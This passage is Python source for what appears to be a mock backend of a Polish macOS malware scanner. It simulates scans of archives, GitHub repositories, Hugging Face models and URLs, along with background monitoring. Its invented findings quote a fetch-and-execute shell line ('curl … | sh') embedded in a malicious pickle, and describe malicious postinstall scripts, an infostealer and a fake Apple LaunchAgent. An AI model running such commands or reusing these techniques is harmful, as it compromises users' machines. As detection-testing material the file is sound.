        out.append({"id": rid, "mode": mode, "title": title, "verdict": verdict, "started": started,
                    "files": files, "report_html": html_path, "report_json": json_path})
    nap(0.2)
    emit("history", items=out)


def cmd_quarantine(path):
    nap(0.6)
    log(f"(mock) Udaję przeniesienie do kwarantanny: {path} – plik NIE został ruszony")
    emit("quarantined", path=path, id=sha(path)[:16])


def cmd_scan(paths, ai):
    title = os.path.basename(os.path.normpath(paths[0])) or paths[0]
    if len(paths) > 1:
        title = f"{title} i {len(paths) - 1} inne"
    readonly_sandbox_stage()
    load_stage()
    stage("enumerate", "Wyszukiwanie plików…")
    files = [] if SYNTHETIC else list_real(paths)
    if not files:
        files = synthetic_files(1204, base=HOME)
    for k in range(1, 6):
        emit("progress", stage="enumerate", found=int(len(files) * k / 5))
        nap(0.12)
    log(f"Znaleziono {len(files)} plików do skanowania")
    stage("scan", "Skanowanie plików…")
    first = os.path.abspath(os.path.expanduser(paths[0]))
    if os.path.isdir(first) or (not os.path.exists(first) and not os.path.splitext(first)[1]):
        base = first
    else:
        base = os.path.dirname(first)
    planned = {} if CLEAN else {
        12: finding_eicar(base),
        33: finding_script(os.path.join(base, "skrypty/install-helper.sh"), ai=ai),
        51: finding_info_adhoc(os.path.join(base, "Narzędzia/QuickConvert.app/Contents/MacOS/QuickConvert")),
    }
    found, nbytes, done = run_scan_loop(files, planned, label_every=20)
    behavior_stage(found)
    if ai and not CANCELLED:
        ai_stage(found)
    finish("scan", "deep", title, done, max(nbytes, 1), found, skipped=2, sandbox=READONLY_SANDBOX,
           errors=["Brak uprawnień do odczytu: ~/Library/Mail (wymaga Full Disk Access)"])


ISOLATION = ["brak dostępu do sieci (sandbox-exec: deny network*)",
             "zapis tylko do izolowanego katalogu roboczego",
             "limity: 20 GB rozpakowanych danych, 200 000 plików, 30 min",
             "katalog roboczy usuwany po skanie"]


def sandbox_tree(root, entries, verdicts):
    tree = []
    for path, size in entries:
        tree.append({"path": f"{root}/{path}", "size": size, "verdict": verdicts.get(path, "CLEAN")})
    return tree


def run_sandboxed(title, root, entries, verdicts, planned, mode, ai, repo=None, limits=None,
                  extra_download=None, url=None, before_sandbox=None):
    if before_sandbox:
        before_sandbox()
    if extra_download:
        extra_download()
    stage("sandbox", "Uruchamianie izolowanego sandboksa…")
    log("Utworzono katalog roboczy /private/var/folders/…/T/cerber-sbx-7f3a2c")
    log("sandbox-exec: profil cerber-extract (bez sieci, zapis tylko do katalogu roboczego)")
    sandbox_selfcheck()
    nap(0.3)
    stage("extract", "Rozpakowywanie w izolowanym sandboksie…")
    total_bytes = sum(s for _, s in entries)
    for k in range(1, 9):
        if CANCELLED:
            break
        emit("progress", stage="extract", files=int(len(entries) * k / 8), bytes=int(total_bytes * k / 8))
        nap(0.15)
    load_stage()
    stage("scan", "Skanowanie rozpakowanych plików…")
    files = [(f"{root}/{p}", s) for p, s in entries]
    found, nbytes, _done = run_scan_loop(files, planned)
    behavior_stage(found)
    for r in found:     # a verdict raised by the behaviour step shows in the archive tree too
        for k, v in list(verdicts.items()):
            if r["path"].endswith(k.split(">>")[-1]) and RANK.get(r["verdict"], 0) > RANK.get(v, 0):
                verdicts[k] = r["verdict"]
    if ai and not CANCELLED:
        ai_stage(found)
    log("Katalog roboczy usunięty")
    sandbox = {"extracted_files": len(entries), "extracted_bytes": total_bytes, "depth": 2,
               "tree": sandbox_tree(root, entries, verdicts), "limits_hit": limits or [],
               "isolation": ISOLATION, "verified": VERIFIED}
    finish(mode, "deep", title, len(entries), total_bytes, found, sandbox=sandbox, repo=repo, url=url)


def cmd_sandbox(archive, ai):
    name = os.path.basename(archive) or "archiwum.zip"
    root = re.sub(r"\.(zip|7z|rar|tar|tgz|tar\.gz|tar\.xz|dmg|pkg|iso)$", "", name, flags=re.I) or "archiwum"
    entries = [
        ("README.txt", 1840), ("Instrukcja instalacji.pdf", 412_334), ("Setup.app/Contents/Info.plist", 1622),
        ("Setup.app/Contents/MacOS/Setup", 1_482_336), ("Setup.app/Contents/Resources/AppIcon.icns", 318_220),
        ("Setup.app/Contents/Resources/install.sh", 2184), ("Setup.app/Contents/_CodeSignature/CodeResources", 3311),
        ("bonus/eicar_test.zip", 214), ("bonus/eicar_test.zip>>eicar.com", 68),
        ("dodatki/sterowniki.pkg", 9_200_114), ("dodatki/sterowniki.pkg>>Payload/usr/local/bin/drvctl", 802_112),
        ("dodatki/sterowniki.pkg>>Scripts/postinstall", 911),
        ("licencja/EULA.rtf", 22_048), ("licencja/LICENSE.txt", 1_077),
    ] + [(f"zasoby/obrazy/ekran_{i:02d}.png", 120_000 + i * 731) for i in range(1, 13)] + [
        ("zasoby/dźwięki/start.aiff", 88_120), ("zasoby/czcionki/Inter-Regular.otf", 309_744),
    ]
    verdicts = {} if CLEAN else {
        "Setup.app/Contents/Resources/install.sh": "SUSPICIOUS", "bonus/eicar_test.zip": "MALICIOUS",
        "bonus/eicar_test.zip>>eicar.com": "MALICIOUS", "Setup.app/Contents/MacOS/Setup": "INFO",
    }
    planned = {} if CLEAN else {
        18: finding_eicar(f"/sandbox/{root}/bonus", can_q=False, display=f"{root}/bonus/eicar_test.zip"),
        40: finding_script(f"/sandbox/{root}/Setup.app/Contents/Resources/install.sh", can_q=False,
                           display=f"{root}/Setup.app/Contents/Resources/install.sh", ai=ai),
        52: finding_info_adhoc(f"/sandbox/{root}/Setup.app/Contents/MacOS/Setup", can_q=False,
                               display=f"{root}/Setup.app/Contents/MacOS/Setup"),
    }
    run_sandboxed(name, root, entries, verdicts, planned, "sandbox", ai,
                  limits=["zasoby/wideo/intro.mov (3,1 GB) przekracza limit 2 GB na plik – pominięto"])


def parse_github(url):
    m = re.match(r"^(?:https?://)?(?:www\.)?github\.com/([^/\s]+)/([^/\s#?]+?)(?:\.git)?(?:/tree/([^\s?#]+))?/?$", url)
    if m:
        return m.group(1), m.group(2), m.group(3)
    m = re.match(r"^([A-Za-z0-9-]+)/([A-Za-z0-9._-]+)$", url)
    if m:
        return m.group(1), m.group(2), None
    return None


def download_stage(total):
    stage("download", "Pobieranie archiwum…")
    for k in range(1, 11):
        if CANCELLED:
            break
        emit("progress", stage="download", bytes=int(total * k / 10), total=total)
        nap(0.12)
    log(f"Pobrano {total} B")


def cmd_github(url, ai):
    parsed = parse_github(url)
    if not parsed or "nieistnieje" in url:
        stage("download", "Pobieranie archiwum…")
        nap(0.5)
        emit("error", msg="Nie udało się pobrać repozytorium: nie istnieje albo jest prywatne (HTTP 404).",
             fatal=True)
        sys.exit(1)
    owner, name, ref = parsed
    ref = ref or "main"
    archive = 3_412_998
    entries = [
        ("README.md", 6_210), ("LICENSE", 1_068), ("package.json", 1_944), ("package-lock.json", 288_400),
        ("src/index.js", 12_200), ("src/cli.js", 4_388), ("src/lib/http.js", 8_120), ("src/lib/config.js", 2_210),
        ("src/lib/updater.js", 5_602), ("scripts/postinstall.js", 3_901), ("scripts/build.sh", 1_204),
        ("test/fixtures/eicar_test.zip", 214), ("test/fixtures/eicar_test.zip>>eicar.com", 68),
        ("test/http.test.js", 9_870), ("test/config.test.js", 3_302), (".github/workflows/ci.yml", 1_420),
        ("docs/architektura.md", 14_220), ("docs/img/diagram.svg", 22_908),
    ]
    verdicts = {} if CLEAN else {
        "scripts/postinstall.js": "SUSPICIOUS", "test/fixtures/eicar_test.zip": "MALICIOUS",
        "test/fixtures/eicar_test.zip>>eicar.com": "MALICIOUS",
    }
    root = f"{name}-{ref.replace('/', '-')}"
    planned = {} if CLEAN else {
        22: finding_eicar(f"/sandbox/{root}/test/fixtures", can_q=False,
                          display=f"{name}/test/fixtures/eicar_test.zip"),
        47: result(f"/sandbox/{root}/scripts/postinstall.js", "SUSPICIOUS", 58,
                   "Heurystyka:NPM.PostinstallFetchExec", 3_901, "js", [
                       det("NPM.PostinstallFetchExec", "heuristic", "MEDIUM", 35,
                           "Skrypt postinstall pobiera plik z sieci i uruchamia go (child_process.exec).", None),
                       det("JS.ObfuscatorIO", "heuristic", "LOW", 15,
                           "Kod zaciemniony obfuscator.io (tablica stringów + rotacja) – zdekodowano 2 warstwy.",
                           "postinstall.js>>deobf#2"),
                       det("IOC:URLhaus", "ioc", "LOW", 8,
                           "Domena cdn-npm-mirror[.]top występowała w URLhaus (2025, nieaktywna).",
                           "postinstall.js>>deobf#2"),
                   ], display=f"{name}/scripts/postinstall.js", can_q=False),
    }
    repo = {"source": "github", "owner": owner, "name": name, "kind": "repo", "ref": ref,
            "url": f"https://github.com/{owner}/{name}" + (f"/tree/{ref}" if ref != "main" else ""),
            "description": "Lekki klient HTTP z obsługą ponawiania żądań i cache dla Node.js",
            "stars": 1284, "archive_bytes": archive, "files_total": len(entries), "files_downloaded": len(entries),
            "skipped": []}
    run_sandboxed(f"github.com/{owner}/{name}", root, entries, verdicts, planned, "github", ai, repo=repo,
                  extra_download=lambda: download_stage(archive))


def parse_hf(url):
    m = re.match(r"^(?:https?://)?(?:www\.)?(?:huggingface\.co|hf\.co)/(?:(datasets|spaces)/)?([^/\s]+)/([^/\s?#]+)", url)
    if m:
        kind = {"datasets": "dataset", "spaces": "space"}.get(m.group(1) or "", "model")
        return kind, m.group(2), m.group(3)
    m = re.match(r"^([A-Za-z0-9._-]+)/([A-Za-z0-9._-]+)$", url)
    if m:
        return "model", m.group(1), m.group(2)
    return None


def cmd_huggingface(url, ai):
    parsed = parse_hf(url)
    if not parsed:
        emit("error", msg="To nie jest adres modelu, zbioru danych ani Space’a na Hugging Face.", fatal=True)
        sys.exit(1)
    kind, owner, name = parsed
    entries = [
        ("config.json", 1_402), ("generation_config.json", 184), ("tokenizer.json", 3_620_112),
        ("tokenizer_config.json", 51_202), ("special_tokens_map.json", 590), ("README.md", 8_890),
        ("modeling_custom.py", 18_340), ("configuration_custom.py", 4_120), ("pytorch_model.bin", 1_204_118),
        ("pytorch_model.bin>>archive/data.pkl", 88_204),
        ("model-00001-of-00002.safetensors#header", 41_022), ("model-00002-of-00002.safetensors#header", 39_880),
        ("model.Q4_K_M.gguf#header", 702_112),
    ]
    verdicts = {} if CLEAN else {"pytorch_model.bin": "MALICIOUS", "pytorch_model.bin>>archive/data.pkl": "MALICIOUS",
                                 "modeling_custom.py": "SUSPICIOUS", "model.Q4_K_M.gguf#header": "INFO"}
    root = name
    planned = {} if CLEAN else {
        15: result(f"/sandbox/{root}/pytorch_model.bin", "MALICIOUS", 140, "Pickle:DangerousImport.posix.system",
                   1_204_118, "pytorch", [
                       det("Pickle.DangerousImport", "heuristic", "CERTAIN", 100,
                           "Pickle importuje posix.system i wywołuje go przy wczytaniu (REDUCE) – "
                           "torch.load() wykona polecenie powłoki.", "pytorch_model.bin>>archive/data.pkl"),
                       det("Pickle.EmbeddedShell", "heuristic", "HIGH", 40,
                           "Argument wywołania: „curl -s http://45.155.205.12/x | sh”.",
                           "pytorch_model.bin>>archive/data.pkl"),
                       det("IOC:ThreatFox", "ioc", "HIGH", 30, "Adres 45.155.205.12 – ThreatFox: serwer dystrybucji malware.",
                           "pytorch_model.bin>>archive/data.pkl"),
                   ], display=f"{name}/pytorch_model.bin", worst="pytorch_model.bin>>archive/data.pkl", can_q=False),
        36: result(f"/sandbox/{root}/modeling_custom.py", "SUSPICIOUS", 48, "Heurystyka:Python.RemoteCodeNetwork",
                   18_340, "python", [
                       det("Python.TrustRemoteCode", "heuristic", "MEDIUM", 20,
                           "Kod ładowany przez trust_remote_code=True (auto_map w config.json).", None),
                       det("Python.SubprocessAtImport", "heuristic", "MEDIUM", 20,
                           "Przy imporcie modułu uruchamiany jest subprocess.Popen z poleceniem z base64.", None),
                       det("Python.NetworkAtImport", "heuristic", "LOW", 8,
                           "Wywołanie urllib.request.urlopen do zewnętrznego adresu podczas importu.", None),
                   ], display=f"{name}/modeling_custom.py", can_q=False, ai={
                       "mode": "verify", "verdict": "malicious", "confidence": 0.71, "family_match": "different",
                       "points": 2, "points_raw": 2, "cap": 15, "accusations": [
                           {"id": "A1", "name": "Python.SubprocessAtImport", "engine": "heuristic",
                            "strength": "MEDIUM", "score": 20, "verdict": "confirmed", "confidence": 0.8,
                            "agree": True, "grounded": True, "points": 2, "quote": "subprocess.Popen(base64.b64decode(",
                            "reason_pl": "Import modułu uruchamia zakodowane polecenie – model tego nie potrzebuje."},
                           {"id": "A2", "name": "Python.TrustRemoteCode", "engine": "heuristic", "strength": "MEDIUM",
                            "score": 20, "verdict": "refuted", "confidence": 0.6, "agree": True, "grounded": True,
                            "points": 0, "quote": "auto_map",
                            "reason_pl": "auto_map to zwykły mechanizm modeli z własnym kodem."}],
                       "summary_pl": "Kod modelu przy imporcie uruchamia zakodowane polecenie i łączy się z siecią – "
                                     "nie ma to związku z działaniem modelu."} if ai else None),
        58: result(f"/sandbox/{root}/model.Q4_K_M.gguf", "INFO", 6, "GGUF:ChatTemplate.Complex", 702_112, "gguf", [
            det("GGUF.ChatTemplate", "heuristic", "INFO", 6,
                "Szablon czatu Jinja w metadanych GGUF jest złożony (412 linii), ale nie zawiera "
                "odwołań do atrybutów Pythona.", "model.Q4_K_M.gguf#header"),
        ], display=f"{name}/model.Q4_K_M.gguf", can_q=False),
    }
    skipped = [
        {"path": "model-00001-of-00002.safetensors", "size": 4_943_162_336, "reason": "bezpieczny format – sprawdzono nagłówek"},
        {"path": "model-00002-of-00002.safetensors", "size": 2_669_351_976, "reason": "bezpieczny format – sprawdzono nagłówek"},
        {"path": "model.Q4_K_M.gguf", "size": 4_368_439_584, "reason": "pobrano tylko nagłówek GGUF (metadane i szablon czatu)"},
        {"path": "onnx/model.onnx", "size": 7_811_200_000, "reason": "przekracza limit 2 GB – pominięto"},
        {"path": "images/benchmark.png", "size": 412_008, "reason": "plik graficzny – nie wykonuje kodu"},
    ]
    prefix = {"dataset": "datasets/", "space": "spaces/"}.get(kind, "")
    repo = {"source": "huggingface", "owner": owner, "name": name, "kind": kind, "ref": "main",
            "url": f"https://huggingface.co/{prefix}{owner}/{name}",
            "description": "Mały model czatu dostrojony do języka polskiego (eksperymentalny)",
            "stars": 342, "archive_bytes": 6_401_220, "files_total": 18, "files_downloaded": 13, "skipped": skipped}
    run_sandboxed(f"huggingface.co/{prefix}{owner}/{name}", root, entries, verdicts, planned, "huggingface", ai,
                  repo=repo, extra_download=lambda: download_stage(6_401_220))


# ------------------------------------------------------------------------------------------- url

def cmd_url(link, ai):
    u = urlparse(link if "://" in link else "https://" + link)
    if u.scheme not in ("http", "https") or not u.hostname:
        emit("error", fatal=True, msg="To nie jest adres http(s).")
        sys.exit(1)
    bad = "malware" in link.lower()
    stage("check", "Sprawdzanie adresu…")
    if bad:
        chain = [link, "http://cdn-files-update.top/d/2f9a1c", "http://cdn-files-update.top/get/Faktura_2026_10.zip"]
        final, domain, ip = chain[-1], "cdn-files-update.top", "185.220.101.47"
        for msg in ["DNS: cdn-files-update.top → 185.220.101.47 (zarejestrowana 4 dni temu)",
                    "Przekierowania: 2", "Brak TLS (http)", "URLhaus: trafienie – malware_download"]:
            log(msg)
            nap(0.25)
        info = {"input": link, "final_url": final, "redirects": chain, "status": 200,
                "content_type": "application/zip", "server": "nginx", "domain": domain, "ip": ip, "tls": None,
                "ioc": ["URLhaus: cdn-files-update.top – malware_download (AMOS Stealer, 2026-09-28)",
                        "ThreatFox: 185.220.101.47 – serwer C2 AMOS Stealer"],
                "page": None,
                "files": [{"name": "Faktura_2026_10.zip", "url": final, "size": 2_418_220,
                           "content_type": "application/zip", "sha256": sha(final)}],
                "skipped": [],
                "notes": ["Domena zarejestrowana 4 dni temu", "Plik serwowany przez nieszyfrowane http",
                          "Nazwa pliku podszywa się pod fakturę"]}
        files = [("Faktura_2026_10.zip", 2_418_220)]
    else:
        host = u.hostname if u.hostname.startswith("www.") else "www." + u.hostname
        final = u._replace(scheme="https", netloc=host).geturl()   # typical http→https / www redirect
        domain = host
        page = not re.search(r"\.(zip|dmg|pkg|7z|rar|exe|msi|tar\.gz|tgz|iso)$", u.path, re.I)
        for msg in [f"DNS: {domain} → 93.184.216.34", "TLS 1.3, certyfikat ważny do 2026-12-01",
                    "Adres nie występuje w URLhaus/ThreatFox"]:
            log(msg)
            nap(0.25)
        if page:
            base = final.rstrip("/").rsplit("/", 1)[0]
            files = [("narzedzie-2.4.1-arm64.dmg", 48_220_118), ("narzedzie-2.4.1-portable.zip", 21_330_004),
                     ("SHA256SUMS.txt", 412)]
            info_files = [{"name": n, "url": f"{base}/pobierz/{n}", "size": sz,
                           "content_type": "application/x-apple-diskimage" if n.endswith(".dmg")
                           else ("application/zip" if n.endswith(".zip") else "text/plain"),
                           "sha256": sha(n)} for n, sz in files]
            skipped = [{"url": f"{base}/pobierz/narzedzie-2.4.1-x64.exe", "reason": "plik dla Windows – pominięto"},
                       {"url": f"{base}/pobierz/narzedzie-2.4.1-src.tar.gz", "reason": "kod źródłowy (38 MB) – pominięto, limit 3 plików"}]
            pinfo = {"title": "Narzędzie 2.4.1 – pobieranie", "links_found": 14}
            ctype = "text/html; charset=utf-8"
            notes = ["Strona zawierała 14 linków – pobrano 3 pliki do pobrania pasujące do macOS",
                     "Pliki pobrano w sandboksie bez ciasteczek i bez dostępu do Twojej przeglądarki"]
        else:
            name = os.path.basename(u.path) or "plik.bin"
            files = [(name, 31_220_440)]
            info_files = [{"name": name, "url": final, "size": 31_220_440, "content_type": "application/octet-stream",
                           "sha256": sha(name)}]
            skipped, pinfo, ctype = [], None, "application/octet-stream"
            notes = ["Link prowadził bezpośrednio do pliku"]
        info = {"input": link, "final_url": final, "redirects": [link, final] if link != final else [link],
                "status": 200, "content_type": ctype, "server": "cloudflare", "domain": domain, "ip": "93.184.216.34",
                "tls": {"issuer": "Let's Encrypt R11", "subject": domain, "expires": "2026-12-01", "version": "TLSv1.3"},
                "ioc": [], "page": pinfo, "files": info_files, "skipped": skipped, "notes": notes}

    def download():
        stage("download", "Pobieranie plików w sandboksie…")
        total = sum(sz for _, sz in files)
        got = 0
        for i, (_, sz) in enumerate(files, 1):
            for k in range(1, 5):
                if CANCELLED:
                    return
                emit("progress", stage="download", bytes=got + int(sz * k / 4), total=total if not bad else None,
                     files=i - 1 if k < 4 else i, files_total=len(files))
                nap(0.12)
            got += sz
        log(f"Pobrano {len(files)} plik(i), {got} B")

    if bad:
        entries = [("Faktura_2026_10.zip", 2_418_220), ("Faktura_2026_10.zip>>Faktura.app/Contents/Info.plist", 1_204),
                   ("Faktura_2026_10.zip>>Faktura.app/Contents/MacOS/Faktura", 4_880_112),
                   ("Faktura_2026_10.zip>>Faktura.app/Contents/Resources/run.sh", 912),
                   ("Faktura_2026_10.zip>>.DS_Store", 6_148)]
        verdicts = {} if CLEAN else {"Faktura_2026_10.zip": "MALICIOUS",
                                     "Faktura_2026_10.zip>>Faktura.app/Contents/MacOS/Faktura": "MALICIOUS",
                                     "Faktura_2026_10.zip>>Faktura.app/Contents/Resources/run.sh": "SUSPICIOUS"}
        planned = {} if CLEAN else {
            25: result("/sandbox/pobrane/Faktura_2026_10.zip", "MALICIOUS", 150, "YARA:MacOS_Stealer_AMOS", 2_418_220, "zip", [
                det("MacOS_Stealer_AMOS", "yara", "CERTAIN", 100,
                    "Atomic macOS Stealer (AMOS): kradnie hasła z pęku kluczy, ciasteczka i portfele kryptowalut.",
                    "Faktura_2026_10.zip>>Faktura.app/Contents/MacOS/Faktura"),
                det("MalwareBazaar:AMOS", "hash", "CERTAIN", 100, "SHA-256 pliku wykonywalnego znany z MalwareBazaar.",
                    "Faktura_2026_10.zip>>Faktura.app/Contents/MacOS/Faktura"),
                det("macOS.AdHocSignature", "macos", "INFO", 5, "Podpis ad-hoc, brak notaryzacji.",
                    "Faktura_2026_10.zip>>Faktura.app/Contents/MacOS/Faktura"),
            ], display="pobrane/Faktura_2026_10.zip", worst="Faktura_2026_10.zip>>Faktura.app/Contents/MacOS/Faktura",
                can_q=False),
            48: finding_script("/sandbox/pobrane/Faktura_2026_10.zip>>Faktura.app/Contents/Resources/run.sh", can_q=False,
                               display="pobrane/Faktura.app/Contents/Resources/run.sh", ai=ai),
        }
    else:
        entries = []
        for n, sz in files:
            entries.append((n, sz))
            if n.endswith(".dmg"):
                entries += [(f"{n}>>Narzędzie.app/Contents/Info.plist", 1_802),
                            (f"{n}>>Narzędzie.app/Contents/MacOS/Narzędzie", 18_220_440),
                            (f"{n}>>Narzędzie.app/Contents/_CodeSignature/CodeResources", 9_120)]
            if n.endswith(".zip"):
                entries += [(f"{n}>>narzedzie/narzedzie", 20_118_330), (f"{n}>>narzedzie/README.md", 4_204)]
        verdicts, planned = {}, {}
    run_sandboxed(domain, "pobrane", entries, verdicts, planned, "url", ai, url=info, extra_download=download)


# ------------------------------------------------------------------------------------------ watch

def cmd_watch(level, quarantine, idle, net=False):
    """`python -m cerber watch run --app`: background protection stream. Stops on SIGINT/SIGTERM or stdin EOF."""
    import threading

    def stdin_watch():
        try:
            while sys.stdin.read(1):
                pass
        except Exception:  # noqa: BLE001
            pass
        global CANCELLED
        CANCELLED = True
        err("[mock] stdin zamknięte – kończę")

    if not NOSLEEP:
        threading.Thread(target=stdin_watch, daemon=True).start()
    dl = os.path.join(HOME, "Downloads")
    spots = [
        ("download", "pobrane", dl, True, None),
        ("desktop", "biurko", os.path.join(HOME, "Desktop"), False, "Operation not permitted"),
        ("app", "aplikacje", "/Applications", True, None),
        ("app", "aplikacje użytkownika", os.path.join(HOME, "Applications"), True, None),
        ("autostart", "autostart", os.path.join(HOME, "Library/LaunchAgents"), True, None),
        ("autostart", "autostart systemowy", "/Library/LaunchDaemons", True, None),
        ("helper", "narzędzia uprzywilejowane", "/Library/PrivilegedHelperTools", True, None),
        ("pkg", "instalacje pkg", "/var/db/receipts", True, None),
        ("bin", "programy Homebrew", "/opt/homebrew/bin", True, None),
        ("extension", "rozszerzenia przeglądarek",
         os.path.join(HOME, "Library/Application Support/Google/Chrome/Default/Extensions"), True, None),
    ]
    net_report = os.path.join(REPORT_DIR, "siec-" + _dt.datetime.now().strftime("%Y%m%d") + ".html")
    emit("watch_ready", level=level, quarantine=quarantine, net=net, net_report=net_report if net else None,
         spots=[{"kind": k, "kind_pl": kp, "path": p, "ok": ok, "error": e} for k, kp, p, ok, e in spots])
    emit("watch_sandbox", verified=VERIFIED)
    emit("watch_worker", state="stopped")

    def wait(sec):
        nap(sec)
        return not CANCELLED

    def item(kind, kind_pl, path, **kw):
        return {"kind": kind, "kind_pl": kind_pl, "path": path, "name": os.path.basename(path), **kw}

    # 1) a clean download
    clean = os.path.join(dl, "VLC-3.0.21-arm64.dmg")
    if not wait(2.0):
        sys.exit(0)
    emit("watch_new", **item("download", "pobrane", clean))
    if not wait(1.0):
        sys.exit(0)
    emit("watch_worker", state="loading")
    emit("watch_scanning", **item("download", "pobrane", clean, note="obraz dysku – rozpakowywanie w sandboksie"))
    emit("watch_notice", title="Cerber", subtitle="Sprawdzam nowy plik", msg="VLC-3.0.21-arm64.dmg (pobrane)", level="info")
    if not wait(1.5):
        sys.exit(0)
    emit("watch_worker", state="ready", patterns=PATTERNS_TOTAL)
    emit("watch_result", **item("download", "pobrane", clean, note="obraz dysku"), verdict="CLEAN", files=412, scanned=412,
         seconds=8.4, flagged=[], report=None, time=now())
    emit("watch_notice", title="Cerber ✅ czysty", subtitle="VLC-3.0.21-arm64.dmg", msg="Sprawdzono 412 plików – nic nie znaleziono.",
         level="info")
    # 2) a malicious download, quarantined
    bad = os.path.join(dl, "faktura_2026_10.zip")
    if not wait(2.5):
        sys.exit(0)
    emit("watch_new", **item("download", "pobrane", bad))
    if not wait(0.8):
        sys.exit(0)
    emit("watch_scanning", **item("download", "pobrane", bad, note="archiwum zip"))
    if not wait(1.0):
        sys.exit(0)
    rid = "watch-" + _dt.datetime.now().strftime("%Y%m%d-%H%M%S")
    os.makedirs(REPORT_DIR, exist_ok=True)
    report = os.path.join(REPORT_DIR, rid + ".html")
    with open(report, "w", encoding="utf-8") as fh:
        fh.write("<!doctype html><meta charset=utf-8><h1>Cerber – ochrona w tle (mock)</h1>"
                 "<p>faktura_2026_10.zip: MALICIOUS – MacOS_Stealer_AMOS (przeniesiono do kwarantanny)</p>")
    qid = sha(bad)[:16] if quarantine else None
    emit("watch_result", **item("download", "pobrane", bad, note="archiwum zip"), verdict="MALICIOUS", files=5, scanned=5,
         seconds=3.1, flagged=[{"path": bad + ">>Faktura.app/Contents/MacOS/Faktura", "verdict": "MALICIOUS",
                                "primary": "YARA:MacOS_Stealer_AMOS", "score": 150, "quarantined": qid,
                                "quarantine_error": None}],
         report=report, time=now())
    emit("watch_notice", title="Cerber ⛔ ZŁOŚLIWY", subtitle="faktura_2026_10.zip",
         msg="AMOS Stealer – " + ("plik przeniesiono do kwarantanny." if quarantine else "usuń ten plik!"), level="error")
    emit("watch_alert", title="Cerber: wykryto złośliwy plik",
         msg="faktura_2026_10.zip zawiera AMOS Stealer (kradnie hasła i portfele). "
             + ("Plik przeniesiono do kwarantanny." if quarantine else "Automatyczna kwarantanna jest wyłączona – usuń plik."),
         report=report)
    # 3) a new autostart item that is fine
    agent = os.path.join(HOME, "Library/LaunchAgents/com.spotify.webhelper.plist")
    if not wait(2.0):
        sys.exit(0)
    emit("watch_new", **item("autostart", "autostart", agent))
    emit("watch_scanning", **item("autostart", "autostart", agent, note="LaunchAgent"))
    if not wait(0.6):
        sys.exit(0)
    emit("watch_result", **item("autostart", "autostart", agent, note="LaunchAgent"), verdict="INFO", files=1, scanned=1,
         seconds=0.4, flagged=[{"path": agent, "verdict": "INFO", "primary": "macOS:LaunchAgentUserDir", "score": 4,
                                "quarantined": None, "quarantine_error": None}], report=None, time=now())
    if net:
        # 4) network & remote-access guard (--net)
        os.makedirs(REPORT_DIR, exist_ok=True)
        with open(net_report, "w", encoding="utf-8") as fh:
            fh.write("<!doctype html><meta charset=utf-8><h1>Cerber – sieć i zdalny dostęp (mock)</h1>"
                     "<p>Ktoś połączył się z Twoim Makiem: Udostępnianie ekranu (VNC) z 192.168.1.23</p>")
        stats = dict(connections_new=41, public_new=17, listening_new=1, inbound=1, sessions_new=0, processes_remote=1,
                     uploaded_bytes=48_000_000, alerts=1)
        emit("watch_net_status", active=True, since=now(), polls=12, interval_s=10.0, log_checked=now(),
             permissions=False, limitations=["nowe uprawnienia (nagrywanie ekranu, dostępność, odczyt klawiatury) nie są "
                                             "śledzone – Cerber nie ma Pełnego dostępu do dysku"], report=net_report, **stats)
        net_items = [
            {"id": "ne-1", "time": now()[11:], "kind": "connection", "severity": "info", "score": 0,
             "title": "Połączenie przychodzące z sieci lokalnej: 192.168.1.7 → rapportd:49152", "detail": "port 49152",
             "process": "rapportd", "pid": 512, "exe": "/usr/libexec/rapportd", "remote": "192.168.1.7:58211",
             "host": None, "signer": "Apple"},
            {"id": "ne-2", "time": now()[11:], "kind": "inbound", "severity": "suspicious", "score": 45,
             "title": "Ktoś połączył się z Twoim Makiem: Udostępnianie ekranu (VNC) z 192.168.1.23",
             "detail": "Udostępnianie ekranu (VNC)", "process": "screensharingd", "pid": 901,
             "exe": "/System/Library/CoreServices/RemoteManagement/screensharingd.bundle/Contents/MacOS/screensharingd",
             "remote": "192.168.1.23:50122", "host": None, "signer": "Apple",
             "confidence": "medium", "attack": None, "trust": "apple", "ioc": False, "target": None,
             "evidence": ["Zdalne sterowanie ekranem tego Maca (VNC) [192.168.1.23:50122]",
                          "Połączenie z innego komputera w sieci lokalnej, nie z tego Maca"],
             "signals": ["NetWatch.Inbound.ScreenSharing"]},
            {"id": "ne-3", "time": now()[11:], "kind": "log", "severity": "low", "score": 12,
             "title": "Błędne hasło przy odblokowaniu Maca", "detail": "uprawnienie: system.login.screensaver · wpis w "
             "dzienniku o " + now()[11:], "process": "authd", "pid": None, "exe": None, "remote": None, "host": None,
             "signer": None, "confidence": "low", "evidence": ["Nieudane odblokowanie Maca hasłem [1×]"],
             "signals": ["NetWatch.Syslog.AuthFailure"], "ioc": False},
        ]
        for it in net_items:
            if not wait(0.4):
                sys.exit(0)
            emit("watch_net", item=it, report=net_report)
        emit("watch_notice", title="Cerber ⚠️ sieć i zdalny dostęp", subtitle=net_items[1]["title"],
             msg="Udostępnianie ekranu (VNC)", level="warning")
    if NOSLEEP:
        emit("watch_worker", state="stopped")
        sys.exit(0)
    # idle: unload the engine, then wait until stopped
    t0 = time.time()
    unloaded = False
    while not CANCELLED:
        time.sleep(0.1)
        if not unloaded and time.time() - t0 > min(idle, 8) / SPEED:
            emit("watch_worker", state="stopped")
            unloaded = True
    err("[mock] watch: zatrzymano")
    sys.exit(0)


# ---------------------------------------------------------------------------------------- laptop

def environment_findings(level):
    h = HOME
    findings = [
        {"category": "persistence", "title": "LaunchAgent uruchamia skrypt z ukrytego katalogu",
         "location": f"{h}/Library/LaunchAgents/com.apple.softwareupdate.helper.plist", "severity": "suspicious",
         "score": 60, "description": "Agent startuje przy logowaniu i podszywa się pod Apple (com.apple.*), "
                                     "choć leży w katalogu użytkownika i nie jest podpisany.",
         "evidence": [f"ProgramArguments: /bin/bash {h}/Library/Application Support/.helper/update.sh",
                      "RunAtLoad = true, KeepAlive = true",
                      "Plik utworzony 2026-10-02 23:41, 3 dni temu"]},
        {"category": "browser", "title": "Rozszerzenie Chrome „PDF Converter Pro” zmienia wyszukiwarkę",
         "location": f"{h}/Library/Application Support/Google/Chrome/Default/Extensions/ehhkfhegcenpfoanmgfpfhnmdmflkbgk",
         "severity": "pua", "score": 40,
         "description": "Rozszerzenie spoza Chrome Web Store z uprawnieniami do wszystkich stron; "
                        "przekierowuje wyszukiwania przez search-baron[.]com.",
         "evidence": ["permissions: <all_urls>, webRequest, tabs, storage",
                      "chrome_settings_overrides.search_provider: search-baron.com"]},
